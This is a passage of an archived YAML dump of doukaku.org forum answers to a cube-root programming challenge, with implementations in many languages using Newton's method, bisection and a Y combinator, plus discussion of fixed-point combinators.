    1e-12:\n    y = y_next\n    y_next = y - (y * y * y - x) / (3.0 * y * y)\n  return
    y\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2878'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2878
  :user_name: kkobayashi
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/232/
  :language: R
  :time: 2007/09/03 16:15 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">立方根関数、指数関数、対数関数は禁止・・・ということは\r\n数値解析関数なら使っていいに違いないｗ\r\nuniroot()関数は内部でBrent法を使用しています。\r\n\r\n&gt;
    cube_root(100)\r\n[1] \"4.641588833613\"\r\n&gt; cube_root(10)\r\n[1] \"2.154434690032\"\r\n</pre>\n\t"
  :code: |
    cube_root &lt;- function(x){
       sprintf("%.12f", uniroot(function(y)(y*y*y - x), c(0, 1000), tol=1e-12)$root)
    }
  :tags: []
  :references:
    :url: /web/20090411100033/http://en.wikipedia.org/wiki/Brent%27s_method
    :title: Brent's method - Wikipedia
- :id: '2890'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2890
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: 
  :time: 2007/09/04 06:46 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">新しいjavascript:～の投稿を禁止しました。\r\nあと「こんにちはこんにちは」は\r\n「立方根の計算」というお題に対する解答ではないので\r\nコメント欄に移動しておきました。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2898'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2898
  :user_name: 匿名
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/4/
  :language: C
  :time: 2007/09/04 10:21 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  相対誤差も絶対誤差も 1e-12 以下になるようにしてみました。\r\n浮動小数点演算の誤差は相対誤差を基本に考えた方が幸せになれるような気がしたので。\r\n\n\t"
  :code: |
    #include&lt;stdio.h&gt;
    #include&lt;stdlib.h&gt;
    #include&lt;time.h&gt;
    #include&lt;math.h&gt;
    #include&lt;assert.h&gt;

    #define EPS 1e-12

    double cubicrt(double x)
    {
        double y,oldy,z=1.0;
        if(x==0.0){
            return 0.0;
        }
        while(fabs(x)&gt;8){
            x/=8;
            z*=2;
        }
        while(fabs(x)&lt;0.125){
            x*=8;
            z/=2;
        }
        y=x;
        do{
            oldy=y;
            y=2*oldy/3+x/(3*oldy*oldy);
        }while(fabs(y-oldy)&gt;fabs(EPS*oldy) || fabs(y-oldy)&gt;EPS);

        return y*z;
    }

    void test(double x,double y,double truey,double eps)
    {
        assert(fabs(y-truey)&lt;=fabs(eps*y) &amp;&amp; fabs(y-truey)&lt;=eps);
        return;
    }

    int main()
    {
        int i=0;
        double x,y;
        srand(time(NULL));

        /* テスト */
        for(i=0;i&lt;1000;i++){
            x=rand()*2000.0/RAND_MAX-500;
            y=cubicrt(x);
            test(x,y*y*y,x,EPS);
        }
        for(i=0;i&lt;1000;i++){
            x=rand()*2e-310/RAND_MAX-1e-310;
            y=cubicrt(x);
            test(x,y*y*y,x,EPS);
        }
        return 0;
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2900'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2900
  :user_name: matyr
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/343/
  :language: 
  :time: 2007/09/04 11:57 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t    残念。でも、妥当な措置だと思います。\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2922'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2922
  :user_name: にしお
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/1/
  :language: Python
  :time: 2007/09/06 07:23 GMT
  :vote_count: '4'
  :vote_score: '4'
  :body: "\n\t  <p>サーバ移転で忙しくてほったらかしになっていました。\r\n</p>\r\n<p>先日チャットで議論した結果、親記事がYコンビネータと呼んでいるコードは「不動点関数として有名なYコンビネータ」とは別物だという結論に達しました。というわけでYコンビネータを使ったバージョンを載せておきます。2行目と3行目がYコンビネータの定義です。\r\n</p>\r\n<p>参考文献：<a
    href=\"/web/20090411100033/http://en.wikipedia.org/wiki/Y_combinator\">Fixed point
    combinator - Wikipedia, the free encyclopedia\r\n</a> \r\n   , <a href=\"/web/20090411100033/http://www.nishiohirokazu.org/blog/2006/10/pythony_1.html\">Pythonで階乗を求める(Yコンビネータ編)</a>\r\n</p>\r\n<p>簡単に説明すると、Yコンビネータというのは与えられた関数の不動点(与えられた関数をfとするとf(x)
    = xになるようなx)を求める関数の一つです。\r\n</p>\r\n<p>で、Yコンビネータに与えられる関数は上のコードではどこにあるのかというと、\r\n
    \  4行目から8行目の(1.0)の直前までです。\r\n   名前が付いていなくて説明しにくいのでこの関数を仮にstepと呼ぶことにします。\r\n   ここまでのところはY(step)という形になっているわけです。\r\n
    \  で、Yが不動点を求める関数なのでY(step)は関数stepの不動点になります。\r\n   つまりY(step) = step(Y(step))です。\r\n
    \  ここでstepの定義に目を移してみると、これは関数fを受け取って\r\n   「yを受け取ってそのまま返したり、fを呼んだ結果を返したりする関数」\r\n
    \  を返す関数です。\r\n   step(Y(step))は「yを受け取ってそのまま返したり、Y(step)を呼んだ結果を返したりする関数」\r\n   を返すわけです。\r\n
    \  Y(step)を呼ぶということはstep(Y(step))を呼ぶということと同じなので、どこまで行っても呼ばれるのはY(step)です。\r\n   こうやって再帰呼び出しを(関数に名前をつけることなく)実現しているわけです。\r\n</p>\r\n<p>そして最後の(1.0)でその関数に1.0を渡しています。\r\n</p>\r\n<p>とまぁ、長々と説明しましたが、ここには僕より詳しい人がたくさんいると思うので、間違っていたらつっこんでもらえるかなと半分期待しつつ自分の理解を確かめるつもりで書いてみました。\r\n</p>\r\n\r\n\r\n\n\t"
  :code: |
    &gt;&gt;&gt; cube_root = lambda x:(
          (lambda f:((lambda g: f(lambda x: g(g)(x)))
                      (lambda g: f(lambda x: g(g)(x)))))
          (lambda f:
               lambda y:
                   y
                   if abs(y ** 3 - x) &lt; 1e-13
                   else f(((x/y**2)+(y*2)) / 3.0))(1.0))

    &gt;&gt;&gt; cube_root(10.0)
    2.1544346900318838
    &gt;&gt;&gt; cube_root(100.0)
    4.6415888336127793
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2928'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2928
  :user_name: nobsun
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/98/
  :language: 
  :time: 2007/09/06 12:49 GMT
  :vote_count: '4'
  :vote_score: '4'
  :body: "\n\t  <pre class=\"compact\">二分法や不動点関数を使った平方根や立方根の具体的な計算についても\r\nSICP に記述があります\r\n\r\nhttp://mitpress.mit.edu/sicp/full-text/book/book-Z-H-12.html#%_sec_1.3.3\r\nhttp://mitpress.mit.edu/sicp/full-text/book/book-Z-H-12.html#%_sec_1.3.4\r\n\r\n先の議論では不動点関数と，不動点関数としてのＹ「コンビネータ」とを\r\nなんとなく混乱してつかっているような感じがします．コンビネータというの\r\nは自由変数を含まないラムダ抽象のことですよね．
    \r\n\r\nラムダ抽象の本体部分では束縛変数以外の名前を使えないので，\r\n関数(ラムダ抽象)に名前をつけるとき，その式の中にその名前を使うことは\r\nできません．\r\n\r\nλf.(λx.f(x
    x))(λx.f(x x))というラムダ抽象はコンビネータで，不動点関数\r\nとしての性質を満します．これをＹコンビネータと呼ぶのだと思います．\r\n\r\nHaskellやMLの型システムでは，上のラムダ抽象に含まれる
    x x という\r\n自己適用式に型付けできないので，このラムダ抽象は Haskell や ML では正\r\nしい式としては認められません．つまり，Haskell
    では不動点関数を\r\n「コンビネータ」としては定義できないということになります．\r\n\r\nHaskellでは不動点関数を定義するのは可能で\r\n\r\ny
    f = f (y f) \r\n\r\nと定義すれば y が不動点関数ということになります．\r\n\r\n</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2929'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2929
  :user_name: kozima
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/164/
  :language: 
  :time: 2007/09/06 14:36 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">OCaml でも引数を全部明示的に書くと大丈夫みたいです。\r\n(λ計算の言葉でいうと
    eta-expansion)\r\n\r\n# let rec y f x = f (y f) x;;\r\nval y : (('a -&gt; 'b)
    -&gt; 'a -&gt; 'b) -&gt; 'a -&gt; 'b = &lt;fun&gt;\r\n# let fact = y (fun f x
    -&gt; if x=0 then 1 else x * (f (x-1)));;\r\nval fact : int -&gt; int = &lt;fun&gt;\r\n#
    fact 10;;\r\n- : int = 3628800</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2935'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2935
  :user_name: かも
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/67/
  :language: Perl
  :time: 2007/09/07 06:47 GMT
  :vote_count: '1'
  :vote_score: '1'
  :body: "\n\t  <pre class=\"compact\">単純なニュートン法。1000までならこれで十分。</pre>\n\t"
  :code: |
    my $d = 10 ** -12;

    sub check($$$){
      my ($x, $y, $d) = @_;
      return abs($y - $x ** 3) &lt; $d;
    }

    sub improve($$){
      my ($x, $a) = @_;
      return (2 * $x ** 3 + $a) / (3 * $x ** 2);
    }

    sub cube_root($){
      my $a = $_[0];
      return 0 if $a == 0;
      my $p = 1;
      my $q;
      until(check($p, $a, $d)){
        $q = $p;
        $p = improve($p, $a);
      }
      $p;
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2936'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2936
  :user_name: かも
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/67/
  :language: Perl
  :time: 2007/09/07 06:53 GMT
  :vote_count: '2'
  :vote_score: '2'
  :body: "\n\t  <pre class=\"compact\">もっと精度が必要な場合は、Math::BigFloatを使うとよいと思います。(check,
    improveはまったく同じです。)</pre>\n\t"
  :code: |
    use Math::BigFloat;

    my $d = Math::BigFloat-&gt;new("1E-12");

    sub check($$$){
      my ($x, $y, $d) = @_;
      return abs($y - $x ** 3) &lt; $d;
    }

    sub improve($$){
      my ($x, $a) = @_;
      return (2 * $x ** 3 + $a) / (3 * $x ** 2);
    }

    sub cube_root($){
      my $a = Math::BigFloat-&gt;new($_[0]);
      my $p = Math::BigFloat-&gt;bone();
      my $q;
      until(check($p, $a, $d)){
        $q = $p;
        $p = improve($p, $a);
      }
      $p-&gt;ffround(-12);
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '2947'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/2947
  :user_name: vtwntmtn
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/380/
  :language: C
  :time: 2007/09/09 05:15 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">gcc version 3.4.2 (mingw-special)で動作確認しました。\r\n終了条件のチェックはこれでいいのかな？</pre>\n\t"
  :code: |
    #include &lt;cmath&gt;

    long double cube_root(long double x, long double min = 0.0, long double max = 1000.0)
    {
        long double mid = (min + max) / 2.0;
        if((mid == min) || (mid == max))
            return mid;
        return ((std::pow(mid, 3) - x) &gt; 0) ?  cube_root(x, min, mid) : cube_root(x, mid, max);
    }

    /*
    #include &lt;cstdlib&gt;
    #include &lt;iomanip&gt;
    #include &lt;iostream&gt;

    int main(int argc, char * argv[])
    {
        long double x = std::atof(argv[1]);
        std::cout &lt;&lt; std::setprecision(15) &lt;&lt; cube_root(x) &lt;&lt; std::endl;
        return EXIT_SUCCESS;
    }
    */
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '3199'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/3199
  :user_name: naranja
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/448/
  :language: D
  :time: 2007/09/30 14:40 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">ニュートン法で。</pre>\n\t"
  :code: |
    import std.stdio;
    import std.math;

    real cube_root(real x){
        real y0 = 3;
        while(true){
            real y1 = (2 * y0 + x / (y0 * y0)) / 3;
            if(abs(y1 - y0) &lt; 1e-14) return y1;
            y0 = y1;
        }
    }

    void main(){
        foreach(r; [cube_root(10.0), cube_root(100.0)]){
            writefln("%.13f ^ 3 = %.13f", r, pow(r, 3));
              //=&gt; 2.1544346900319 ^ 3 = 10.0000000000000
              //=&gt; 4.6415888336128 ^ 3 = 100.0000000000000
        }
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '3244'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/3244
  :user_name: matarillo
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/136/
  :language: C
  :time: 2007/10/04 07:24 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">ニュートン法にしました。</pre>\n\t"
  :code: |
    public static double CubeRoot(double x)
    {
      double a0 = (double)(-x);
      double[] a = { a0, 0.0, 0.0, 1.0 };
      return SolveAlgebraicEquationByNewtonMethod(a, 1e-12);
    }

    delegate double MathFunc(double x);

    static double SolveAlgebraicEquationByNewtonMethod(double[] a, double delta)
    {
      MathFunc f = CreateFunc(a);
      MathFunc fPrime = CreateFunc(Derivative(a));
      double x = 1.0;
      while (NearlyEquals(fPrime(x), 0.0, double.Epsilon))
        x += 1.0;
      double betterX = 0;
      while (true)
      {
        betterX = Newton(f, fPrime, x);
        if (NearlyEquals(x, betterX, delta))
          break;
        x = betterX;
      }
      return betterX;
    }

    static MathFunc CreateFunc(double[] a)
    {
      return delegate(double x)
      {
        double fx = 0.0;
        for (int i = 0; i &lt; a.Length; i++)
        {
          double d = a[i];
          if (NearlyEquals(d, 0.0, double.Epsilon))
            continue;
          for (int j = 0; j &lt; i; j++)
            d *= x;
          fx += d;
        }
        return fx;
      };
    }

    static double[] Derivative(double[] a)
    {
      double[] aPrime = new double[a.Length - 1];
      for (int i = 1; i &lt; a.Length; i++)
      {
        aPrime[i - 1] = a[i] * (double)i;
      }
      return aPrime;
    }

    static double Newton(MathFunc f, MathFunc fPrime, double x)
    {
      return x - (f(x) / fPrime(x));
    }

    static bool NearlyEquals(double d1, double d2, double delta)
    {
      return (((d1 - d2) &lt;= delta) &amp;&amp; ((d2 - d1) &lt;= delta));
    }
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '4006'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/4006
  :user_name: 匿名
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/4/
  :language: 
  :time: 2007/11/14 10:31 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  \n<p><a href=\"/web/20090411100033/http://ja.doukaku.org/comment/2868/\">#2868</a>をなでしこに移植しました\n</p>\n\n\n\n\t"
  :code: "●立方根(xの)\n    yとは実数\n    y_nextとは実数=x \n    (ABS(y-y_next)&gt;=1e-12)の間\n
    \       y=y_next\n        y_next=y-(y*y*y-x)/(3*y*y)\n    yで戻る\n4の立方根を表示\n4^(1/3)を表示\n"
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '4595'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/4595
  :user_name: mad
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/418/
  :language: Haskell
  :time: 2007/12/03 16:35 GMT
  :vote_count: '2'
  :vote_score: '2'
  :body: "\n\t  <p>自動微分ライブラリを使ってみました。\nHackageDBにあります。</p>\n<p>このライブラリのderiv関数を使うと導関数を「数値的に」ではなく「記号的に」求める事ができます。\nつまりf'(x)
    = {f(x + h) - f(x)} / hという近似を利用するのではなく、\n(x^3)' = 3x^2\nの様に直接導関数を生成します。</p>\n<p>円周率と自然対数も求めてみました。</p>\n\n\t"
  :code: |
    import Data.Number.Dif

    newton f init eps =
      let f' = deriv f
          next = init - (unDif f init) / (f' init)
      in if abs (next - init) &lt; eps
        then init
        else newton f next eps


    -- aの立方根は x^3 - a = 0の解
    cbrt a = newton (\x -&gt; x**3 - a) 1 1e-13

    main = do
      putStrLn $ "cbrt 10   = " ++ show (cbrt 10)
      putStrLn $ "cbrt 100  = " ++ show (cbrt 100)
      putStrLn $ "cbrt 1000 = " ++ show (cbrt 1000)
      putStrLn $ "pi        = " ++ show (newton sin 3 1e-13)
      putStrLn $ "e         = " ++ show (newton (\x -&gt; log x - 1) 2 1e-13)

    {-
    *Main&gt; :main
    cbrt 10   = 2.154434690031884
    cbrt 100  = 4.641588833612779
    cbrt 1000 = 10.000000000000004
    pi        = 3.141592653589793
    e         = 2.7182818284590455
    -}
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '4757'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/4757
  :user_name: vtwntmtn
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/380/
  :language: Erlang
  :time: 2007/12/11 14:45 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">1&gt; c(cube_root).\r\n{ok,cube_root}\r\n2&gt;
    io:format(\"~15.13f~n\", [cube_root:cube_root(10.0)]).\r\n2.1544346900319\r\nok\r\n3&gt;
    io:format(\"~15.13f~n\", [cube_root:cube_root(100.0)]).\r\n4.6415888336128\r\nok\r\n</pre>\n\t"
  :code: |
    -module(cube_root).
    -export([cube_root/1]).

    cube_root(Num) -&gt; cube_root(Num, 0.0, 1000.0).
    cube_root(Num, Min, Max) -&gt;
        Err = 0.0000000000001,
        Mid = (Min + Max) / 2.0,
        if
            ((Mid - Err) &lt; Min) and (Max &lt; (Mid + Err)) -&gt; Mid;
            ((Mid * Mid * Mid) - Num) &gt; 0 -&gt; cube_root(Num, Min, Mid);
            true -&gt; cube_root(Num, Mid, Max)
        end.
  :tags:
  - Erlang/OTP_R10B-10
  :references:
    :url: 
    :title: 
- :id: '5453'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/5453
  :user_name: pooq
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/606/
  :language: BASIC
  :time: 2008/01/24 22:39 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">電卓でルートキーを使って立方根を求める方法を試そうと思って。\r\n</pre>\n\t"
  :code: |
    !立方根の計算
    FUNCTION cube_root(x)
       LET  y = x
       LET  E = 1e-13
       DO
          LET  y0 = y
          LET  y = SQR(SQR(y * x))
       LOOP  WHILE y0 - y &gt; E
       LET  cube_root = y
    END FUNCTION

    FOR i = 1 TO 1000
       PRINT  i;cube_root(i)
    NEXT i
    END
  :tags:
  - 十進BASIC
  :references:
    :url: 
    :title: 
- :id: '6002'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/6002
  :user_name: まさぽん
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/711/
  :language: Arc
  :time: 2008/03/12 06:06 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  整数部分は配列(リスト)のインデックスで、小数部分は二分探索的なアプローチで求めています。\r<br>三乗根がピッタリ整数の場合は、整数で答えを出すようにしたので、ちょっと長くなりました。\r<br><br>実行例:\r<br>arc&gt; (search-cube-root 10.0)\r<br>2.1544346900318487\r<br>arc&gt; (expt (search-cube-root 10.0) 3)\r<br>9.999999999999513\r<br>arc&gt; (search-cube-root 100.0)\r<br>4.641588833612786\r<br>arc&gt; (expt (search-cube-root 100.0) 3)\r<br>100.00000000000048\r<br>arc&gt; (search-cube-root 125.0)\r<br>5\n\t"
  :code: |
    (= cube-list (map [expt _ 3] (range 1 10)))
    (= acc 0.000000000001)

    (def search-real (cr of rn)
      (let gosa (- rn (expt cr 3))
        (if (&lt; (abs gosa) acc)
            cr
            (if (&lt; 0 gosa)
                (search-real (+ cr of) (/ of 2) rn)
                (search-real (- cr of) (/ of 2) rn)))))

    (def search-cube-root (rn)
      (if (is (type rn) 'int)
          (let i (trunc rn)
            (if (mem i cube-list)
                (+ (pos i cube-list) 1)
                (search-real (+ (pos i (sort &lt; (cons i cube-list))) 0.5) 0.25 rn)))
          (search-real (+ (pos rn (sort &lt; (cons rn cube-list))) 0.5) 0.25 rn)))
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '6003'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/6003
  :user_name: まさぽん
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/711/
  :language: 
  :time: 2008/03/12 06:43 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <pre class=\"compact\">指数関数使用禁止なのを忘れとった。\r\n1 行目は\r\n(= cube-list
    (map [* _ _ _] (range 1 10)))\r\n\r\n5 行目は\r\n  (let gosa (- rn (* cr cr cr))\r\n\r\nですね。</pre>\n\t"
  :code: ''
  :tags: []
  :references:
    :url: 
    :title: 
- :id: '8080'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/8080
  :user_name: genzou
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/793/
  :language: Groovy
  :time: 2008/11/24 16:15 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <p>そのまま。\n関係ないデスが、left、rightの値を変えれば精度も変更可能です。</p>\n\n\t"
  :code: |
    def cubeRoot(num, left=2, right=-16){
        def ans = 0
        left.downto(right){ rank -&gt;
            def findnum = (9..1).find{ (ans + it*(10**rank))**3 &lt;= num }?:0
            ans += findnum*(10**rank)
        }
        ans
    }

    println cubeRoot(10)
    println cubeRoot(100)
  :tags:
  - groovy
  :references:
    :url: 
    :title: 
- :id: '8751'
  :parent_id: '55'
  :url: http://ja.doukaku.org/comment/8751
  :user_name: だいら
  :user_url: /web/20090411100033/http://ja.doukaku.org/user/468/
  :language: PHP
  :time: 2009/03/30 03:59 GMT
  :vote_count: '0'
  :vote_score: '0'
  :body: "\n\t  <p>普通に</p>\n\n\t"
  :code: "&lt;?php\n\nfunction cube_root($num)\n{\n    $a = $num;\n    \n    while(true)\n
    \   {\n        $b = ($num/($a*$a) + $a*2) / 3;\n        ++$i;\n        $diff =
    abs($b - $a);\n        if($diff &lt; 1e-12)break;\n        $a = $b;\n    }\n    return
    $b;\n}\n\n//test code\n$ret = cube_root(10);\nprintf(\"%.16f\\n%.16f\\n\", $ret,
    $ret*$ret*$ret);\n$ret = cube_root(100);\nprintf(\"%.16f\\n%.16f\\n\", $ret, $ret*$ret*$ret);\n"
  :tags: []
  :references:
    :url: 
    :title: 
